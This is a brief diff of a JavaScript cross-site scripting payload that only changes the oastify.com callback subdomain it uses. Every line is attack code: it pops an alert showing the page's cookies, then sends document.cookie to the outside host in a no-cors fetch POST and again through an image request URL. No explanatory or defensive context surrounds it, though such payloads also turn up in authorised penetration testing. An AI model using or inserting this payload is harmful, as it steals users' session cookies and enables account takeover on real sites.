@@ -1,8 +1,8 @@
 alert(document.cookie);
-fetch('https://l7tsy0wifyn6enltuh6ev3q8fzlv9k.oastify.com', {
+fetch('https://hwhuwenjlox7c5oa881juek17sdk19.oastify.com', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
 });
 var i=new Image;
-i.src="l7tsy0wifyn6enltuh6ev3q8fzlv9k.oastify.com/?"+document.cookie;
+i.src="hwhuwenjlox7c5oa881juek17sdk19.oastify.com/?"+document.cookie;
